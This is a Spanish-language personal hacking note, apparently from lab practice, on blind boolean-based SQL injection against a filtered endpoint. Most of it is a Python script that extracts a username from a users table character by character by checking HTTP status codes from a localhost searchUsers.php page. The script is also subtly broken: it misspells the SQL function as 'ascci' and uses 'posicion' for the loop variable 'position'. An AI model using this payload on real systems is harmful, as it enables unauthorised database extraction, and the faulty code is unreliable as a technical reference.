---
tags:
  - HackingTools
---
---
En caso de ser vulnerable a injeciones sql pero que no muestre nada por pantalla o en caso que este sanitizado de manera que no permita escribir comillas en la query podemos hacer lo siguiente.

Sanitizacion en sql para que no admita comillas en la query
![[Pasted image 20250111145456.png]]

Podemos tramitar peticiones mediante `curl` y ver el código de estado de las peticiones
![[Pasted image 20250111145655.png]]
Al ver que nos devuelve algún código de estado nos indica que hay una posible injeccion sql pero sin ver ningún cambio por la web por lo que podemos hacer lo siguiente

```python
#!/usr/bin/python3

import requests
import signal
import sys 
import time
import string
from pwn import *

def def_handler(sig, frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://localhost/searchUsers.php"
characteres = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)
 
	p2 = log.progress("Datos extraidos")
	extracted_info = "" 

	for position in range(1, 150):
		for character in range(33,126):
				sqli_url = main_url + "?id=9 or (select(select ascci(substring(username,%d,1)) from users where id=1)=%d)" % (posicion, character)
	
				r = requests.get(sqli_url)
	
				if r.status_code == 200:
					extracted_info += chr(character)
					p2.status(extracted_info)
					break 


# Flujo principal
if __name__ == '__main__':
	makeSQLI()
```

